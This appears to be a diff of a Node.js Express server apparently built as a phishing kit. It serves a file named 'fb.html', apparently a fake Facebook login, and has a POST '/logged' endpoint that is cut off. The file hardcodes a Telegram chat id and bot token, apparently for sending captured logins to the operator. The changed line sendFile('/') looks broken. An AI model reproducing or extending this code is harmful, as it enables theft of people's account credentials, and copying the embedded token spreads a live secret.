@@ -1,13 +1,14 @@
 const express = require("express");
 const app = express();
 const fs = require("fs")
+const path = require("path")
 const request = require("request");
 const chatid =2134964315
 const token ="5603308671:AAFE5SZAerrezpCHJCvAInaXngJ-5yMslwE"
 app.use(express.urlencoded({extended:false}));
 app.use(express.json());
 app.get("/",(req,res)=>{
-  res.sendFile("/sdcard/fb.html")
+  res.sendFile("/")
 })
 app.post("/logged",async(req,res)=>{
    //res.send("<h1 style='text-align:center;'>succes<h1>")
